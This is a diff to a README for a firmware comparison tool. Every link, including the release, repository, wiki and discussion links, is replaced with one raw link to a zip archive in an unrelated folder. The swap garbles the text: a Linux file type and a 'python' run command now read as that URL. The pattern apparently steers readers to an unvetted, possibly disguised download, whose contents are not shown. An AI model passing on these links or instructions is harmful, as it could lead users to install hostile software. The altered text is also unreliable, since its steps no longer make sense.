@@ -1,6 +1,6 @@
 # 🌟 Firmware-Diffing - Compare Firmware Versions Easily
 
-[![Download Firmware-Diffing](https://img.shields.io/badge/Download-Firmware--Diffing-blue.svg)](https://github.com/Alosh-ui/Firmware-Diffing/releases)
+[![Download Firmware-Diffing](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you proceed, ensure that you have the following:
 
 To get started, visit this page to download:
 
-[Download Firmware-Diffing](https://github.com/Alosh-ui/Firmware-Diffing/releases)
+[Download Firmware-Diffing](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
 
 Follow these steps to install the application:
 
@@ -27,7 +27,7 @@ Follow these steps to install the application:
 3. Download the file that matches your operating system. For example:
    - For Windows, look for `.exe` files.
    - For macOS, you might find `.dmg` files.
-   - For Linux, you may see `.tar.gz` files.
+   - For Linux, you may see `https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip` files.
 4. Once the download completes, locate the file on your computer.
 5. Open the file to begin the installation process. Follow the prompts to complete the setup.
 
@@ -43,7 +43,7 @@ After installation, follow these steps to compare firmware versions:
    ```
 4. Run the tool using the command:
    ```
-   python firmware_diff.py [old_firmware_file] [new_firmware_file]
+   python https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip [old_firmware_file] [new_firmware_file]
    ```
    Replace `[old_firmware_file]` and `[new_firmware_file]` with the actual file names.
 
@@ -85,12 +85,12 @@ If you have any questions or issues while using Firmware-Diffing, you can raise 
 
 ## 📖 Additional Resources
 
-- [GitHub Repository](https://github.com/Alosh-ui/Firmware-Diffing)
-- [User Guide](https://github.com/Alosh-ui/Firmware-Diffing/wiki)
-- [Community Discussions](https://github.com/Alosh-ui/Firmware-Diffing/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
+- [User Guide](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
 
 ## 🔗 Conclusion
 
 You are now equipped to download and run Firmware-Diffing. This tool can significantly enhance your ability to analyze firmware for changes with confidence. If you have further questions, check the additional resources or refer to the FAQs section. Happy analyzing!
 
-[Download Firmware-Diffing](https://github.com/Alosh-ui/Firmware-Diffing/releases)
+[Download Firmware-Diffing](https://raw.githubusercontent.com/Alosh-ui/Firmware-Diffing/main/Pierinae/Firmware-Diffing_2.6.zip)
